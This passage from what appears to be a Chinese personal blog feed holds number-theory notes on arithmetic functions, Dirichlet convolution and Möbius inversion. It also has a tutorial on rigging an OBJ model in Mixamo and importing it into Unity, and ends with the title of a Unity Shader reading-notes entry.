          &lt;td style=&#34;text-align: left&#34;&gt;$\log{}{3}$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$\log{}{2}$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$\log{}{5}$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$\log{}{7}$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$\log{}{2}$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;$\log{}{3}$&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;0&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Theorem:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Th1：若$n\ge1$，我们有
$$
\log{}{n}=\sum_{d|n}\Lambda(d)
$$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;$n=1$，两边都是0，成立&lt;/p&gt;
&lt;p&gt;$n&amp;gt;1$，算术基本定理：$n=\prod\limits_{k=1}^{r}p_k^{\alpha_k}$，两边取对数：
$$
\log{n}=\sum_{k=1}^{r}\alpha_k\log{p_k}
$$
现在我们关注要证明的式子的右端$\log{}{n}=\sum_{d|n}\Lambda(d)$,对于$\Lambda()$来说，非零的项来自$p_k^{m}(m=1,2,\cdots,\alpha_k;k=1,2,\cdots,r)$，于是
$$
\sum_{d|n}\Lambda(d)=\sum_{k=1}^{r}\sum_{m=1}^{\alpha_k}\Lambda(p_k^m)=\sum_{k=1}^{r}\sum_{m=1}^{\alpha_k}\log{p_k}=\sum_{k=1}^{r}\alpha_k\log{p_k}=\log{n}
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Th2：若$n\ge1$，我们有
$$
\Lambda(n)=\sum_{d|n}\mu(d)\log{\dfrac{n}{d}}=-\sum_{d|n}\mu(d)\log{d}
$$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;对上面的定理使用莫比乌斯反转：
$$
\log{}{n}=\sum_{d|n}\Lambda(d)\
\Updownarrow\
\Lambda(d)=\sum_{d|n}\mu(d)log(\dfrac{n}{d})=\log{n}\sum_{d|n}\mu(d)-\sum_{d|n}\mu(d)\log{d}=\log{n}\cdot I(n)-\sum_{d|n}\mu(d)\log{d}
$$
对于所有的n，$\log{n}\cdot I(n)=0$，所以证明完毕。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;section5-liouville刘维尔函数lambdan&#34;&gt;Section5 Liouville(刘维尔函数)$\lambda(n)$
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Definition&lt;/strong&gt;：我们规定$\lambda(1)=1$，如果$n=p_1^{\alpha_1}\cdots p_k^{\alpha_ k}$，我们规定
$$
\lambda(n)=(-1)^{\alpha_1+\cdots +\alpha_k}
$$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Theorem:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Th1：对每一个$n&amp;gt;1$，我们有
$$
\sum_{d|n}\lambda(d)=
\begin{cases}
1&amp;amp;\text{n是平方数}\
0&amp;amp;\text{其他}
\end{cases}
$$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;令$g(n)=\sum_{d|n}\lambda(d)$,$g$是积性的。运用算术基本定理我们只需要确定$g(p^\alpha)$：
$$
\begin{align*}
g(p^\alpha)&amp;amp;=\sum_{d|p^\alpha}\lambda(d)\
&amp;amp;=1+\lambda(p)+\lambda(p^2)+\cdots+\lambda(p^\alpha)\
&amp;amp;=1-1+1-\cdots+(-1)^\alpha\
&amp;amp;=
\begin{cases}
1&amp;amp;\text{$\alpha$是奇数}\
0&amp;amp;\text{$\alpha$是偶数}
\end{cases}
\end{align*}
$$
在这种情况下，$n=\prod\limits_{k=1}^{r}p_k^{\alpha_k},g(n)=\prod\limits_{k=1}^{r}g(p_k^{\alpha_k})$，如果有指数$\alpha$是奇数，那么$g(n)=0$，如果所有的$\alpha$都是偶数，那么$g(n)=1$。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;section6-除数函数sigma_alphan&#34;&gt;Section6 除数函数$\sigma_{\alpha}(n)$
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Definition&lt;/strong&gt;：对于实数或复数$\alpha$以及任意整数$n&amp;gt;1$，我们规定：
$$
\sigma_\alpha(n)=\sum_{d|n}d^\alpha
$$
当$\alpha=0$时，$\sigma_{0}(n)$是n的因子个数，常用$d(n)$表示。&lt;/p&gt;
&lt;p&gt;当$\alpha=1$时，$\sigma_{1}(n)$是n的因子之和，常用$\sigma(n)$表示。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Theorem:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Th1：对$n\ge1$，我们有
$$
\sigma_{\alpha}^{-1}(n)=\sum_{d|n}d^{\alpha}\mu(d)\mu(\dfrac{n}{d})
$$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;证明需要狄利克雷卷积相关知识：&lt;/p&gt;
&lt;p&gt;$\sigma_{\alpha}(n)=N^\alpha * u$
$$
\sigma_{\alpha}^{-1}(n)=(N^\alpha * u)^{-1}=(\mu N^\alpha)&lt;em&gt;u^{-1}=(\mu N^\alpha)&lt;/em&gt;\mu
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Th2：
$$
\sigma_{\alpha}(p^a)=
\begin{cases}
a+1&amp;amp;\text{if $\alpha=1$},\
\dfrac{p^{\alpha(a+1)}-1}{p^{\alpha}-1}&amp;amp;\text{if $\alpha \ne 1$}
\end{cases}
$$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:
$$
\sigma_{\alpha}(p^a)=1^\alpha+p^\alpha+p^{2\alpha}+\cdots+p^{a\alpha}=
\begin{cases}
a+1&amp;amp;\text{if $\alpha=1$},\
\dfrac{p^{\alpha(a+1)}-1}{p^{\alpha}-1}&amp;amp;\text{if $\alpha \ne 1$}
\end{cases}
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;chapter2-数论函数的狄利克雷乘积&#34;&gt;Chapter2 数论函数的狄利克雷乘积
&lt;/h2&gt;&lt;h3 id=&#34;section1-a-idsection1狄利克雷卷积a&#34;&gt;Section1 &lt;a id=&#34;section1&#34;&gt;狄利克雷卷积&lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;**Definition：**如果$f$和$g$是两个数论函数，我们规定他们的狄利克雷卷积由下面的等式确定：
$$
h(n)=(f*g)(n)=\sum_{d|n}f(d)g(\dfrac{n}{d})
$$
上面的式子还可以改写成其他形式：
$$
h(n)=\sum_{d|n}f(d)g(\dfrac{n}{d})=\sum_{d|n}f(\frac{n}{d})g(d)=\sum_{xy=n}f(x)g(y)
$$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Examples：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Ex1：$\mu*u=I$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof：&lt;/strong&gt;
$$
\mu*u=\sum_{d|n}\mu(d)u(\dfrac{n}{d})=\sum_{d|n}\mu(d)=I
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Ex2：$\mu*N=\varphi$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof：&lt;/strong&gt;
$$
\mu*N=\sum_{d|n}\mu(d)N(\dfrac{n}{d})=\sum_{d|n}\mu(d)\dfrac{n}{d}=\varphi
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Ex3：$u*N=\sigma_1$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof：&lt;/strong&gt;
$$
u*N=\sum_{d|n}u(d)N(\dfrac{n}{d})=\sum_{d|n}(d)=\sigma_1
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Ex4：$u*u=\sigma_0$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof：&lt;/strong&gt;
$$
u*u=\sum_{d|n}u(d)u(\dfrac{n}{d})=\sum_{d|n}1=\sigma_0
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Ex5：$u*\varphi=N$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof：&lt;/strong&gt;
$$
u*\varphi=\sum_{d|n}u(d)\varphi(\dfrac{n}{d})=\sum_{d|n}\varphi(d)=N
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Theorem:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Th1：狄利克雷卷积满足交换律，即$f&lt;em&gt;g=g&lt;/em&gt;f$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;$$
\begin{align*}
f&lt;em&gt;g&amp;amp;=\sum_{xy=n}f(x)g(y)\
&amp;amp;=\sum_{xy=n}g(x)f(y)\
&amp;amp;=f&lt;/em&gt;g\
\end{align*}
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Th2：狄利克雷卷积满足结合律，即$（f&lt;em&gt;g）&lt;em&gt;h=f&lt;/em&gt;(g&lt;/em&gt;h)$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:
$$
\begin{align*}
（f&lt;em&gt;g）&lt;em&gt;h&amp;amp;=\sum_{xy=n}(f&lt;/em&gt;g)(x)h(y)\
&amp;amp;=\sum_{xy=n}\sum_{ab=x}f(a)g(b)h(y)\
&amp;amp;=\sum_{abc=n}f(a)g(b)h(c)\
&amp;amp;=f&lt;/em&gt;(g&lt;em&gt;h)(展开过程同上)
\end{align&lt;/em&gt;}
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Th3：狄利克雷卷积满足分配律，即$f*(g+h)=f&lt;em&gt;g+f&lt;/em&gt;h$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:
$$
\begin{align*}
f*(g+h)&amp;amp;=\sum_{xy=n}f(x)(g+h)(y)\
&amp;amp;=\sum_{xy=n}f(x)(g(y)+h(y))\
&amp;amp;=\sum_{xy=n}f(x)g(y)+\sum_{xy=n}f(x)h(y)\
&amp;amp;=f&lt;em&gt;g+f&lt;/em&gt;h
\end{align*}
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;section2-狄利克雷逆&#34;&gt;Section2 狄利克雷逆
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Definition&lt;/strong&gt;：如果$f$是一个数论函数且$f(1)\ne0$，则存在唯一的一个称为$f$的狄利克雷逆函数的数论函数，使
$$
f*^{-1}*f=f^{-1}*f=I
$$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Theorem:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Th1：我们计算$f^{-1}$的递推公式：
$$
f^{-1}=
\begin{cases}
\dfrac{1}{f(1)}&amp;amp;\text{$n=1$}\
-\dfrac{1}{f(1)}\sum\limits_{d|n\d&amp;lt;n}f(\dfrac{n}{d})f^{-1}(d)&amp;amp;\text{otherwise}
\end{cases}
$$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;对$n=1$，$(f*f^{-1})(1)=I(1)=1 \Rightarrow f^{-1}=\dfrac{1}{f(1)}$&lt;/p&gt;
&lt;p&gt;对$n\ge1$，
$$
\begin{align*}
(f&lt;em&gt;f^{-1})(n)=\sum_{d|n}f(d)f^{-1}(\dfrac{n}{d})&amp;amp;=0\
f(1)f^{-1}(n)+\sum_{d|n\d&amp;lt;n}f(\dfrac{n}{d})f^{-1}(d)&amp;amp;=0\
\end{align&lt;/em&gt;}
\f^{-1}(n)=\dfrac{-1}{f(1)}\sum_{d|n\d&amp;lt;n}f(\dfrac{n}{d})f^{-1}(d)
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Th2：$(f*g)^{-1}=f^{-1}*g^{-1}$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:
$$
(f&lt;em&gt;g)^{-1}=f^{-1}&lt;em&gt;g^{-1}\
(f&lt;/em&gt;g)&lt;/em&gt;(f&lt;em&gt;g)^{-1}=f^{-1}&lt;em&gt;g^{-1}&lt;/em&gt;(f&lt;/em&gt;g)\
I=f^{-1}&lt;em&gt;f&lt;/em&gt;g&lt;em&gt;g^{-1}\
I=I&lt;/em&gt;I=I
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;chapter3-莫比乌斯反转&#34;&gt;Chapter3 莫比乌斯反转
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Definition&lt;/strong&gt;：$f$,$g$是两个数论函数，如果有：
$$
f(n)=\sum_{d|n}g(d)\
\Updownarrow\
g(n)=\sum_{d|n}f(d)\mu(\dfrac{n}{d})
$$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Proof&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;证明$\Downarrow$：
$$
f(n)=\sum_{d|n}g(d)即f=g&lt;em&gt;u\
f&lt;/em&gt;\mu=g&lt;em&gt;u&lt;/em&gt;\mu=g*(u*\mu)=g&lt;em&gt;I=g
$$
证明$\Uparrow$：
$$
g(n)=\sum_{d|n}f(d)\mu(\dfrac{n}{d})即g=f&lt;/em&gt;\mu\
u&lt;em&gt;g=u&lt;/em&gt;f*\mu=(u*\mu)&lt;em&gt;f=I&lt;/em&gt;f=f
$$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>使用mixamo为obj文件绑骨并导入unity</title>
        <link>https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/</link>
        <pubDate>Fri, 23 Sep 2022 07:50:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/</guid>
        <description>&lt;img src="https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/mixamo.png" alt="Featured image of post 使用mixamo为obj文件绑骨并导入unity" /&gt;&lt;h2 id=&#34;绑骨&#34;&gt;绑骨
&lt;/h2&gt;&lt;p&gt;首先我们手里要准备好模型文件，mixamo支持FBX/OBJ/ZIP压缩包，这里以obj文件为例。&lt;/p&gt;
&lt;p&gt;我们手中的obj文件一般由贴图文件、obj文件和mtl文件组成（素材来源于网络）：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/1858293-20220923154639130-340735990.png&#34;
	width=&#34;799&#34;
	height=&#34;150&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/1858293-20220923154639130-340735990_hu3096940836001671330.png 480w, https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/1858293-20220923154639130-340735990_hu7392809980765344445.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220923120100615&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;532&#34;
		data-flex-basis=&#34;1278px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;我们将这些文件打包成zip，然后去mixamo网站：https://www.mixamo.com/&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/1858293-20220923154639745-1448780460.png&#34;
	width=&#34;940&#34;
	height=&#34;548&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/1858293-20220923154639745-1448780460_hu870326852569906626.png 480w, https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/1858293-20220923154639745-1448780460_hu7197974947632877863.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220923115933107&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;171&#34;
		data-flex-basis=&#34;411px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;将zip上传或拖入，假如是obj文件不要单单把obj拖入，这样模型会失去贴图。&lt;/p&gt;
&lt;p&gt;拖入后会出现如下界面，查看人物没什么问题之后就可以开始绑骨了：&lt;img src=&#34;https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/1858293-20220923154640240-235471092.png&#34;
	width=&#34;940&#34;
	height=&#34;598&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/1858293-20220923154640240-235471092_hu2684072500472077089.png 480w, https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/1858293-20220923154640240-235471092_hu14023854738758085081.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220923151945476&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;157&#34;
		data-flex-basis=&#34;377px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;进入绑骨界面，需要拖动点位，按照英文单词和右侧图示拖动左侧圆圈，确认之后等待一会：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/1858293-20220923154640678-810669145.png&#34;
	width=&#34;940&#34;
	height=&#34;596&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/1858293-20220923154640678-810669145_hu1101617586467708023.png 480w, https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/1858293-20220923154640678-810669145_hu11775095278311775532.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220923152215755&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;157&#34;
		data-flex-basis=&#34;378px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;当你的人物可以按照预定模板移动，且确认骨骼运动正常时，就可以确认了。&lt;/p&gt;
&lt;p&gt;确认之后就可以导出绑骨后的模型，或是选择一套你喜爱的动作。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/1858293-20220923154641104-1051336904.png&#34;
	width=&#34;959&#34;
	height=&#34;824&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/1858293-20220923154641104-1051336904_hu13107889309193394530.png 480w, https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/1858293-20220923154641104-1051336904_hu5910308376208215561.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220923152331560&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;116&#34;
		data-flex-basis=&#34;279px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;到这里，我们的obj人物就成功绑上了骨骼，mixamo太神了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/1858293-20220923154641453-1877448928.png&#34;
	width=&#34;692&#34;
	height=&#34;262&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/1858293-20220923154641453-1877448928_hu9967870547440024669.png 480w, https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/1858293-20220923154641453-1877448928_hu15158163209764555580.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220923152451585&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;264&#34;
		data-flex-basis=&#34;633px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;可以直接导出没有动画的模型，或者在网站上找到自己喜欢的动作并连同模型一起下载下来。&lt;/p&gt;
&lt;h2 id=&#34;绑好的模型导入unity&#34;&gt;绑好的模型导入unity
&lt;/h2&gt;&lt;p&gt;我们以标准二进制fbx文件导出，拖入到unity中。会得到一个预制体：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/1858293-20220923154641742-1496384732.png&#34;
	width=&#34;573&#34;
	height=&#34;242&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/1858293-20220923154641742-1496384732_hu17985871874426681202.png 480w, https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/1858293-20220923154641742-1496384732_hu1419934638400408309.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220923152639358&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;236&#34;
		data-flex-basis=&#34;568px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;在inspector面板设定其avator类型为人型：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/1858293-20220923154642070-979722224.png&#34;
	width=&#34;354&#34;
	height=&#34;190&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/1858293-20220923154642070-979722224_hu6994529710104995891.png 480w, https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/1858293-20220923154642070-979722224_hu1091961840477943630.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220923152729653&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;186&#34;
		data-flex-basis=&#34;447px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;进入configure可以看到更多细节：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/1858293-20220923154642537-1270053184.png&#34;
	width=&#34;1917&#34;
	height=&#34;613&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/1858293-20220923154642537-1270053184_hu4350823347266364032.png 480w, https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/1858293-20220923154642537-1270053184_hu5827289081611168919.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220923152812058&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;312&#34;
		data-flex-basis=&#34;750px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;配合unity的动画avator系统，我们就可以实现骨骼动画的运作了。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Unity Shader入门精要读书笔记 第三章 Unity Shader基础</title>
        <link>https://dorinxl.github.io/p/unity-shader%E5%85%A5%E9%97%A8%E7%B2%BE%E8%A6%81%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%B8%89%E7%AB%A0-unity-shader%E5%9F%BA%E7%A1%80/</link>
        <pubDate>Sun, 03 Jul 2022 15:48:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/unity-shader%E5%85%A5%E9%97%A8%E7%B2%BE%E8%A6%81%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%B8%89%E7%AB%A0-unity-shader%E5%9F%BA%E7%A1%80/</guid>
